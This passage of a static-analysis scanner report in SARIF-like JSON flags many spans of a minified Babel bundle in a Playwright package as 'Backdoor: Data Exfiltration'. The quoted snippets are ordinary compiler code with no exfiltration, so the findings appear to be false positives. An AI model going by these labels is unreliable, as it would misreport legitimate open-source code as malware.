                      "markdown": "`oleanLiteral(re.length>1)),I(q,re.length>1?\"jsxs\":\"jsx\",Y)}function Te(j,q){if(!(l&&!l(j.node,q)))return I(q,\"createElement\",[rs(q,\"id/fragment\")(),z.types.nullLiteral(),...z.types.react.buildChildren(j.node)])}function Pe(j,q){let Y=j.get(\"openingElement\");return I(q,\"createElement\",[Be(Y),dt(q,j,Y.get(\"attributes\")),...z.types.react.buildChildren(j.node)])}function Be(j){let q=O(j.node.name,j.node),Y;return z.types.isIdentifier(q)?Y=q.name:z.types.isStringLiteral(q)&&(Y=q.value),z.types.react.isCompatTag(Y)?z.types.stringLiteral(Y):q}function dt(j,q,Y){let re=rs(j,\"runtime\");if(re!==\"automatic\"){`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 20716,
                  "endLine": 2028,
                  "endColumn": 20721,
                  "snippet": {
                    "text": ">0?[R(re)]:[])),t&&Y.push(j.scope.buildUndefinedNode(),z.types.booleanLiteral(re.length>1)),I(q,re.length>1?\"jsxs\":\"jsx\",Y)}function Te(j,q){if(!(l&&!l(j.node,q)))return I(q,\"createElement\",[rs(q,\"id/fragment\")(),z.types.nullLiteral(),...z.types.react.buildChildren(j.node)])}function Pe(j,q){let Y=j.get(\"openingElement\");return I(q,\"createElement\",[Be(Y),dt(q,j,Y.get(\"attributes\")),...z.types.react.buildChildren(j.node)])}function Be(j){let q=O(j.node.name,j.node),Y;return z.types.isIdentifier(q)?Y=q.name:z.types.isStringLiteral(q)&&(Y=q.value),z.types.react.isCompatTag(Y)?z.types.stringLiteral(Y):",
                    "rendered": {
                      "text": ">0?[R(re)]:[])),t&&Y.push(j.scope.buildUndefinedNode(),z.types.booleanLiteral(re.length>1)),I(q,re.length>1?\"jsxs\":\"jsx\",Y)}function Te(j,q){if(!(l&&!l(j.node,q)))return I(q,\"createElement\",[rs(q,\"id/fragment\")(),z.types.nullLiteral(),...z.types.react.buildChildren(j.node)])}function Pe(j,q){let Y=j.get(\"openingElement\");return I(q,\"createElement\",[Be(Y),dt(q,j,Y.get(\"attributes\")),...z.types.react.buildChildren(j.node)])}function Be(j){let q=O(j.node.name,j.node),Y;return z.types.isIdentifier(q)?Y=q.name:z.types.isStringLiteral(q)&&(Y=q.value),z.types.react.isCompatTag(Y)?z.types.stringLiteral(Y):",
                      "markdown": "`>0?[R(re)]:[])),t&&Y.push(j.scope.buildUndefinedNode(),z.types.booleanLiteral(re.length>1)),I(q,re.length>1?\"jsxs\":\"jsx\",Y)}function Te(j,q){if(!(l&&!l(j.node,q)))return I(q,\"createElement\",[rs(q,\"id/fragment\")(),z.types.nullLiteral(),...z.types.react.buildChildren(j.node)])}function Pe(j,q){let Y=j.get(\"openingElement\");return I(q,\"createElement\",[Be(Y),dt(q,j,Y.get(\"attributes\")),...z.types.react.buildChildren(j.node)])}function Be(j){let q=O(j.node.name,j.node),Y;return z.types.isIdentifier(q)?Y=q.name:z.types.isStringLiteral(q)&&(Y=q.value),z.types.react.isCompatTag(Y)?z.types.stringLiteral(Y):`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 19330,
                  "endLine": 2028,
                  "endColumn": 19335,
                  "snippet": {
                    "text": "perty(q.node.name,Y),q.node)),j}function R(j){let q;if(j.length===1)q=j[0];else if(j.length>1)q=z.types.arrayExpression(j);else return;return z.types.objectProperty(z.types.identifier(\"children\"),q)}function K(j,q){let Y=j.get(\"openingElement\"),re=[Be(Y)],me=[],Se=Object.create(null);for(let Ge of Y.get(\"attributes\"))if(Ge.isJSXAttribute()&&z.types.isJSXIdentifier(Ge.node.name)){let{name:fe}=Ge.node.name;switch(fe){case\"__source\":case\"__self\":if(Se[fe])throw m3(j,fe);case\"key\":{let Qe=_(Ge.node.value);if(Qe===null)throw Ge.buildCodeFrameError('Please provide an explicit key value. Using \"key\" as a ",
                    "rendered": {
                      "text": "perty(q.node.name,Y),q.node)),j}function R(j){let q;if(j.length===1)q=j[0];else if(j.length>1)q=z.types.arrayExpression(j);else return;return z.types.objectProperty(z.types.identifier(\"children\"),q)}function K(j,q){let Y=j.get(\"openingElement\"),re=[Be(Y)],me=[],Se=Object.create(null);for(let Ge of Y.get(\"attributes\"))if(Ge.isJSXAttribute()&&z.types.isJSXIdentifier(Ge.node.name)){let{name:fe}=Ge.node.name;switch(fe){case\"__source\":case\"__self\":if(Se[fe])throw m3(j,fe);case\"key\":{let Qe=_(Ge.node.value);if(Qe===null)throw Ge.buildCodeFrameError('Please provide an explicit key value. Using \"key\" as a ",
                      "markdown": "`perty(q.node.name,Y),q.node)),j}function R(j){let q;if(j.length===1)q=j[0];else if(j.length>1)q=z.types.arrayExpression(j);else return;return z.types.objectProperty(z.types.identifier(\"children\"),q)}function K(j,q){let Y=j.get(\"openingElement\"),re=[Be(Y)],me=[],Se=Object.create(null);for(let Ge of Y.get(\"attributes\"))if(Ge.isJSXAttribute()&&z.types.isJSXIdentifier(Ge.node.name)){let{name:fe}=Ge.node.name;switch(fe){case\"__source\":case\"__self\":if(Se[fe])throw m3(j,fe);case\"key\":{let Qe=_(Ge.node.value);if(Qe===null)throw Ge.buildCodeFrameError('Please provide an explicit key value. Using \"key\" as a `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 19252,
                  "endLine": 2028,
                  "endColumn": 19257,
                  "snippet": {
                    "text": "ypes.stringLiteral(q.node.name.name),j.push(z.types.inherits(z.types.objectProperty(q.node.name,Y),q.node)),j}function R(j){let q;if(j.length===1)q=j[0];else if(j.length>1)q=z.types.arrayExpression(j);else return;return z.types.objectProperty(z.types.identifier(\"children\"),q)}function K(j,q){let Y=j.get(\"openingElement\"),re=[Be(Y)],me=[],Se=Object.create(null);for(let Ge of Y.get(\"attributes\"))if(Ge.isJSXAttribute()&&z.types.isJSXIdentifier(Ge.node.name)){let{name:fe}=Ge.node.name;switch(fe){case\"__source\":case\"__self\":if(Se[fe])throw m3(j,fe);case\"key\":{let Qe=_(Ge.node.value);if(Qe===null)throw G",
                    "rendered": {
                      "text": "ypes.stringLiteral(q.node.name.name),j.push(z.types.inherits(z.types.objectProperty(q.node.name,Y),q.node)),j}function R(j){let q;if(j.length===1)q=j[0];else if(j.length>1)q=z.types.arrayExpression(j);else return;return z.types.objectProperty(z.types.identifier(\"children\"),q)}function K(j,q){let Y=j.get(\"openingElement\"),re=[Be(Y)],me=[],Se=Object.create(null);for(let Ge of Y.get(\"attributes\"))if(Ge.isJSXAttribute()&&z.types.isJSXIdentifier(Ge.node.name)){let{name:fe}=Ge.node.name;switch(fe){case\"__source\":case\"__self\":if(Se[fe])throw m3(j,fe);case\"key\":{let Qe=_(Ge.node.value);if(Qe===null)throw G",
                      "markdown": "`ypes.stringLiteral(q.node.name.name),j.push(z.types.inherits(z.types.objectProperty(q.node.name,Y),q.node)),j}function R(j){let q;if(j.length===1)q=j[0];else if(j.length>1)q=z.types.arrayExpression(j);else return;return z.types.objectProperty(z.types.identifier(\"children\"),q)}function K(j,q){let Y=j.get(\"openingElement\"),re=[Be(Y)],me=[],Se=Object.create(null);for(let Ge of Y.get(\"attributes\"))if(Ge.isJSXAttribute()&&z.types.isJSXIdentifier(Ge.node.name)){let{name:fe}=Ge.node.name;switch(fe){case\"__source\":case\"__self\":if(Se[fe])throw m3(j,fe);case\"key\":{let Qe=_(Ge.node.value);if(Qe===null)throw G`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 17453,
                  "endLine": 2028,
                  "endColumn": 17458,
                  "snippet": {
                    "text": "ession())return!q.isMethod()||q.node.kind!==\"constructor\"?!0:!y(q.parentPath.parentPath);if(q.isTSModuleBlock())return!1}while(j=j.parent);return!0}function I(j,q,Y){let re=z.types.callExpression(rs(j,`id/${q}`)(),Y);return(a!=null?a:rs(j,\"defaultPure\"))&&(0,OSe.default)(re),re}function D(j){let Y=j.get(\"openingElement\").node.attributes,re=!1;for(let me=0;me<Y.length;me++){let Se=Y[me];if(re&&z.types.isJSXAttribute(Se)&&Se.name.name===\"key\")return!0;z.types.isJSXSpreadAttribute(Se)&&(re=!0)}return!1}function O(j,q){return z.types.isJSXIdentifier(j)?j.name===\"this\"&&z.types.isReferenced(j,q)?z.types",
                    "rendered": {
                      "text": "ession())return!q.isMethod()||q.node.kind!==\"constructor\"?!0:!y(q.parentPath.parentPath);if(q.isTSModuleBlock())return!1}while(j=j.parent);return!0}function I(j,q,Y){let re=z.types.callExpression(rs(j,`id/${q}`)(),Y);return(a!=null?a:rs(j,\"defaultPure\"))&&(0,OSe.default)(re),re}function D(j){let Y=j.get(\"openingElement\").node.attributes,re=!1;for(let me=0;me<Y.length;me++){let Se=Y[me];if(re&&z.types.isJSXAttribute(Se)&&Se.name.name===\"key\")return!0;z.types.isJSXSpreadAttribute(Se)&&(re=!0)}return!1}function O(j,q){return z.types.isJSXIdentifier(j)?j.name===\"this\"&&z.types.isReferenced(j,q)?z.types",
                      "markdown": "`ession())return!q.isMethod()||q.node.kind!==\"constructor\"?!0:!y(q.parentPath.parentPath);if(q.isTSModuleBlock())return!1}while(j=j.parent);return!0}function I(j,q,Y){let re=z.types.callExpression(rs(j,`id/${q}`)(),Y);return(a!=null?a:rs(j,\"defaultPure\"))&&(0,OSe.default)(re),re}function D(j){let Y=j.get(\"openingElement\").node.attributes,re=!1;for(let me=0;me<Y.length;me++){let Se=Y[me];if(re&&z.types.isJSXAttribute(Se)&&Se.name.name===\"key\")return!0;z.types.isJSXSpreadAttribute(Se)&&(re=!0)}return!1}function O(j,q){return z.types.isJSXIdentifier(j)?j.name===\"this\"&&z.types.isReferenced(j,q)?z.types`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 13993,
                  "endLine": 2028,
                  "endColumn": 13998,
                  "snippet": {
                    "text": "=_0(),OSe=zf(),_l={importSource:\"react\",runtime:\"automatic\",pragma:\"React.createElement\",pragmaFrag:\"React.Fragment\"},_Se=/^\\s*\\*?\\s*@jsxImportSource\\s+([^\\s]+)\\s*$/m,NSe=/^\\s*\\*?\\s*@jsxRuntime\\s+([^\\s]+)\\s*$/m,kSe=/^\\s*\\*?\\s*@jsx\\s+([^\\s]+)\\s*$/m,BSe=/^\\s*\\*?\\s*@jsxFrag\\s+([^\\s]+)\\s*$/m,rs=(e,t)=>e.get(`@babel/plugin-react-jsx/${t}`),Ms=(e,t,r)=>e.set(`@babel/plugin-react-jsx/${t}`,r);function FSe(e){return e.properties.some(t=>z.types.isObjectProperty(t,{computed:!1,shorthand:!1})&&(z.types.isIdentifier(t.key,{name:\"__proto__\"})||z.types.isStringLiteral(t.key,{value:\"__proto__\"})))}function jSe({",
                    "rendered": {
                      "text": "=_0(),OSe=zf(),_l={importSource:\"react\",runtime:\"automatic\",pragma:\"React.createElement\",pragmaFrag:\"React.Fragment\"},_Se=/^\\s*\\*?\\s*@jsxImportSource\\s+([^\\s]+)\\s*$/m,NSe=/^\\s*\\*?\\s*@jsxRuntime\\s+([^\\s]+)\\s*$/m,kSe=/^\\s*\\*?\\s*@jsx\\s+([^\\s]+)\\s*$/m,BSe=/^\\s*\\*?\\s*@jsxFrag\\s+([^\\s]+)\\s*$/m,rs=(e,t)=>e.get(`@babel/plugin-react-jsx/${t}`),Ms=(e,t,r)=>e.set(`@babel/plugin-react-jsx/${t}`,r);function FSe(e){return e.properties.some(t=>z.types.isObjectProperty(t,{computed:!1,shorthand:!1})&&(z.types.isIdentifier(t.key,{name:\"__proto__\"})||z.types.isStringLiteral(t.key,{value:\"__proto__\"})))}function jSe({",
                      "markdown": "`=_0(),OSe=zf(),_l={importSource:\"react\",runtime:\"automatic\",pragma:\"React.createElement\",pragmaFrag:\"React.Fragment\"},_Se=/^\\s*\\*?\\s*@jsxImportSource\\s+([^\\s]+)\\s*$/m,NSe=/^\\s*\\*?\\s*@jsxRuntime\\s+([^\\s]+)\\s*$/m,kSe=/^\\s*\\*?\\s*@jsx\\s+([^\\s]+)\\s*$/m,BSe=/^\\s*\\*?\\s*@jsxFrag\\s+([^\\s]+)\\s*$/m,rs=(e,t)=>e.get(`@babel/plugin-react-jsx/${t}`),Ms=(e,t,r)=>e.set(`@babel/plugin-react-jsx/${t}`,r);function FSe(e){return e.properties.some(t=>z.types.isObjectProperty(t,{computed:!1,shorthand:!1})&&(z.types.isIdentifier(t.key,{name:\"__proto__\"})||z.types.isStringLiteral(t.key,{value:\"__proto__\"})))}function jSe({`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 8480,
                  "endLine": 2028,
                  "endColumn": 8485,
                  "snippet": {
                    "text": "ionalMemberExpression()||l.isOptionalCallExpression();){let{node:D}=l;D.optional&&o.push(D),l.isOptionalMemberExpression()?(l.node.type=\"MemberExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"object\"))):l.isOptionalCallExpression()&&(l.node.type=\"CallExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"callee\")))}if(o.length===0)return;let u=[],c;for(let D=o.length-1;D>=0;D--){let O=o[D],_=Xe.types.isCallExpression(O),F=_?O.callee:O.object,R=Ci.skipTransparentExprWrapperNodes(F),K,te;if(_&&Xe.types.isIdentifier(R,{name:\"eval\"})?(te=K=R,O.callee=Xe.types.sequenceExpression([Xe.types.numericLiteral",
                    "rendered": {
                      "text": "ionalMemberExpression()||l.isOptionalCallExpression();){let{node:D}=l;D.optional&&o.push(D),l.isOptionalMemberExpression()?(l.node.type=\"MemberExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"object\"))):l.isOptionalCallExpression()&&(l.node.type=\"CallExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"callee\")))}if(o.length===0)return;let u=[],c;for(let D=o.length-1;D>=0;D--){let O=o[D],_=Xe.types.isCallExpression(O),F=_?O.callee:O.object,R=Ci.skipTransparentExprWrapperNodes(F),K,te;if(_&&Xe.types.isIdentifier(R,{name:\"eval\"})?(te=K=R,O.callee=Xe.types.sequenceExpression([Xe.types.numericLiteral",
                      "markdown": "`ionalMemberExpression()||l.isOptionalCallExpression();){let{node:D}=l;D.optional&&o.push(D),l.isOptionalMemberExpression()?(l.node.type=\"MemberExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"object\"))):l.isOptionalCallExpression()&&(l.node.type=\"CallExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"callee\")))}if(o.length===0)return;let u=[],c;for(let D=o.length-1;D>=0;D--){let O=o[D],_=Xe.types.isCallExpression(O),F=_?O.callee:O.object,R=Ci.skipTransparentExprWrapperNodes(F),K,te;if(_&&Xe.types.isIdentifier(R,{name:\"eval\"})?(te=K=R,O.callee=Xe.types.sequenceExpression([Xe.types.numericLiteral`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 8369,
                  "endLine": 2028,
                  "endColumn": 8374,
                  "snippet": {
                    "text": "tern()&&cSe(e)){n.replaceWith(Xe.template.expression.ast`(() => ${n.node})()`);return}let o=[],l=e;for(;l.isOptionalMemberExpression()||l.isOptionalCallExpression();){let{node:D}=l;D.optional&&o.push(D),l.isOptionalMemberExpression()?(l.node.type=\"MemberExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"object\"))):l.isOptionalCallExpression()&&(l.node.type=\"CallExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"callee\")))}if(o.length===0)return;let u=[],c;for(let D=o.length-1;D>=0;D--){let O=o[D],_=Xe.types.isCallExpression(O),F=_?O.callee:O.object,R=Ci.skipTransparentExprWrapperNodes(F),K,te;if(",
                    "rendered": {
                      "text": "tern()&&cSe(e)){n.replaceWith(Xe.template.expression.ast`(() => ${n.node})()`);return}let o=[],l=e;for(;l.isOptionalMemberExpression()||l.isOptionalCallExpression();){let{node:D}=l;D.optional&&o.push(D),l.isOptionalMemberExpression()?(l.node.type=\"MemberExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"object\"))):l.isOptionalCallExpression()&&(l.node.type=\"CallExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"callee\")))}if(o.length===0)return;let u=[],c;for(let D=o.length-1;D>=0;D--){let O=o[D],_=Xe.types.isCallExpression(O),F=_?O.callee:O.object,R=Ci.skipTransparentExprWrapperNodes(F),K,te;if(",
                      "markdown": "`tern()&&cSe(e)){n.replaceWith(Xe.template.expression.ast`(() => ${n.node})()`);return}let o=[],l=e;for(;l.isOptionalMemberExpression()||l.isOptionalCallExpression();){let{node:D}=l;D.optional&&o.push(D),l.isOptionalMemberExpression()?(l.node.type=\"MemberExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"object\"))):l.isOptionalCallExpression()&&(l.node.type=\"CallExpression\",l=Ci.skipTransparentExprWrappers(l.get(\"callee\")))}if(o.length===0)return;let u=[],c;for(let D=o.length-1;D>=0;D--){let O=o[D],_=Xe.types.isCallExpression(O),F=_?O.callee:O.object,R=Ci.skipTransparentExprWrapperNodes(F),K,te;if(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 7683,
                  "endLine": 2028,
                  "endColumn": 7688,
                  "snippet": {
                    "text": "ypes.isIdentifier(e)||Xe.types.isSuper(e)||Xe.types.isMemberExpression(e)&&!e.computed&&Mp(e.object)}function cSe(e){let t=e,{scope:r}=e;for(;t.isOptionalMemberExpression()||t.isOptionalCallExpression();){let{node:n}=t,s=Ci.skipTransparentExprWrappers(t.isOptionalMemberExpression()?t.get(\"object\"):t.get(\"callee\"));if(n.optional)return!r.isStatic(s.node);t=s}}var fSe=Xe.template.expression(\"%%check%% === null || %%ref%% === void 0\"),pSe=Xe.template.expression(\"%%check%% == null\"),dSe=Xe.template.expression(\"%%check%% !== null && %%ref%% !== void 0\"),hSe=Xe.template.expression(\"%%check%% != null\");fu",
                    "rendered": {
                      "text": "ypes.isIdentifier(e)||Xe.types.isSuper(e)||Xe.types.isMemberExpression(e)&&!e.computed&&Mp(e.object)}function cSe(e){let t=e,{scope:r}=e;for(;t.isOptionalMemberExpression()||t.isOptionalCallExpression();){let{node:n}=t,s=Ci.skipTransparentExprWrappers(t.isOptionalMemberExpression()?t.get(\"object\"):t.get(\"callee\"));if(n.optional)return!r.isStatic(s.node);t=s}}var fSe=Xe.template.expression(\"%%check%% === null || %%ref%% === void 0\"),pSe=Xe.template.expression(\"%%check%% == null\"),dSe=Xe.template.expression(\"%%check%% !== null && %%ref%% !== void 0\"),hSe=Xe.template.expression(\"%%check%% != null\");fu",
                      "markdown": "`ypes.isIdentifier(e)||Xe.types.isSuper(e)||Xe.types.isMemberExpression(e)&&!e.computed&&Mp(e.object)}function cSe(e){let t=e,{scope:r}=e;for(;t.isOptionalMemberExpression()||t.isOptionalCallExpression();){let{node:n}=t,s=Ci.skipTransparentExprWrappers(t.isOptionalMemberExpression()?t.get(\"object\"):t.get(\"callee\"));if(n.optional)return!r.isStatic(s.node);t=s}}var fSe=Xe.template.expression(\"%%check%% === null || %%ref%% === void 0\"),pSe=Xe.template.expression(\"%%check%% == null\"),dSe=Xe.template.expression(\"%%check%% !== null && %%ref%% !== void 0\"),hSe=Xe.template.expression(\"%%check%% != null\");fu`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 7667,
                  "endLine": 2028,
                  "endColumn": 7672,
                  "snippet": {
                    "text": "perNodes(e),Xe.types.isIdentifier(e)||Xe.types.isSuper(e)||Xe.types.isMemberExpression(e)&&!e.computed&&Mp(e.object)}function cSe(e){let t=e,{scope:r}=e;for(;t.isOptionalMemberExpression()||t.isOptionalCallExpression();){let{node:n}=t,s=Ci.skipTransparentExprWrappers(t.isOptionalMemberExpression()?t.get(\"object\"):t.get(\"callee\"));if(n.optional)return!r.isStatic(s.node);t=s}}var fSe=Xe.template.expression(\"%%check%% === null || %%ref%% === void 0\"),pSe=Xe.template.expression(\"%%check%% == null\"),dSe=Xe.template.expression(\"%%check%% !== null && %%ref%% !== void 0\"),hSe=Xe.template.expression(\"%%chec",
                    "rendered": {
                      "text": "perNodes(e),Xe.types.isIdentifier(e)||Xe.types.isSuper(e)||Xe.types.isMemberExpression(e)&&!e.computed&&Mp(e.object)}function cSe(e){let t=e,{scope:r}=e;for(;t.isOptionalMemberExpression()||t.isOptionalCallExpression();){let{node:n}=t,s=Ci.skipTransparentExprWrappers(t.isOptionalMemberExpression()?t.get(\"object\"):t.get(\"callee\"));if(n.optional)return!r.isStatic(s.node);t=s}}var fSe=Xe.template.expression(\"%%check%% === null || %%ref%% === void 0\"),pSe=Xe.template.expression(\"%%check%% == null\"),dSe=Xe.template.expression(\"%%check%% !== null && %%ref%% !== void 0\"),hSe=Xe.template.expression(\"%%chec",
                      "markdown": "`perNodes(e),Xe.types.isIdentifier(e)||Xe.types.isSuper(e)||Xe.types.isMemberExpression(e)&&!e.computed&&Mp(e.object)}function cSe(e){let t=e,{scope:r}=e;for(;t.isOptionalMemberExpression()||t.isOptionalCallExpression();){let{node:n}=t,s=Ci.skipTransparentExprWrappers(t.isOptionalMemberExpression()?t.get(\"object\"):t.get(\"callee\"));if(n.optional)return!r.isStatic(s.node);t=s}}var fSe=Xe.template.expression(\"%%check%% === null || %%ref%% === void 0\"),pSe=Xe.template.expression(\"%%check%% == null\"),dSe=Xe.template.expression(\"%%check%% !== null && %%ref%% !== void 0\"),hSe=Xe.template.expression(\"%%chec`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 3028,
                  "endLine": 2028,
                  "endColumn": 3033,
                  "snippet": {
                    "text": ",version:n})=>(r(\"^7.12.0 || >8.0.0-alpha <8.0.0-beta\"),{name:\"transform-class-static-block\",inherits:n[0]===\"8\"?void 0:GN().default,pre(){(0,HN.enableFeature)(this.file,HN.FEATURES.staticBlocks,!1)},visitor:{ClassBody(s){let{scope:i}=s,a=new Set,o=s.get(\"body\");for(let l of o)l.isPrivate()&&a.add(l.get(\"key.id\").node.name);for(let l of o){if(!l.isStaticBlock())continue;let u=JTe(i,a);a.add(u);let c=e.privateName(e.identifier(u)),f,p=l.node.body;p.length===1&&e.isExpressionStatement(p[0])?f=e.inheritsComments(p[0].expression,p[0]):f=t.expression.ast`(() => { ${p} })()`,l.replaceWith(e.classPrivateP",
                    "rendered": {
                      "text": ",version:n})=>(r(\"^7.12.0 || >8.0.0-alpha <8.0.0-beta\"),{name:\"transform-class-static-block\",inherits:n[0]===\"8\"?void 0:GN().default,pre(){(0,HN.enableFeature)(this.file,HN.FEATURES.staticBlocks,!1)},visitor:{ClassBody(s){let{scope:i}=s,a=new Set,o=s.get(\"body\");for(let l of o)l.isPrivate()&&a.add(l.get(\"key.id\").node.name);for(let l of o){if(!l.isStaticBlock())continue;let u=JTe(i,a);a.add(u);let c=e.privateName(e.identifier(u)),f,p=l.node.body;p.length===1&&e.isExpressionStatement(p[0])?f=e.inheritsComments(p[0].expression,p[0]):f=t.expression.ast`(() => { ${p} })()`,l.replaceWith(e.classPrivateP",
                      "markdown": "`,version:n})=>(r(\"^7.12.0 || >8.0.0-alpha <8.0.0-beta\"),{name:\"transform-class-static-block\",inherits:n[0]===\"8\"?void 0:GN().default,pre(){(0,HN.enableFeature)(this.file,HN.FEATURES.staticBlocks,!1)},visitor:{ClassBody(s){let{scope:i}=s,a=new Set,o=s.get(\"body\");for(let l of o)l.isPrivate()&&a.add(l.get(\"key.id\").node.name);for(let l of o){if(!l.isStaticBlock())continue;let u=JTe(i,a);a.add(u);let c=e.privateName(e.identifier(u)),f,p=l.node.body;p.length===1&&e.isExpressionStatement(p[0])?f=e.inheritsComments(p[0].expression,p[0]):f=t.expression.ast`(() => { ${p} })()`,l.replaceWith(e.classPrivateP`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 2978,
                  "endLine": 2028,
                  "endColumn": 2983,
                  "snippet": {
                    "text": ",XTe.declare)(({types:e,template:t,assertVersion:r,version:n})=>(r(\"^7.12.0 || >8.0.0-alpha <8.0.0-beta\"),{name:\"transform-class-static-block\",inherits:n[0]===\"8\"?void 0:GN().default,pre(){(0,HN.enableFeature)(this.file,HN.FEATURES.staticBlocks,!1)},visitor:{ClassBody(s){let{scope:i}=s,a=new Set,o=s.get(\"body\");for(let l of o)l.isPrivate()&&a.add(l.get(\"key.id\").node.name);for(let l of o){if(!l.isStaticBlock())continue;let u=JTe(i,a);a.add(u);let c=e.privateName(e.identifier(u)),f,p=l.node.body;p.length===1&&e.isExpressionStatement(p[0])?f=e.inheritsComments(p[0].expression,p[0]):f=t.expression.ast",
                    "rendered": {
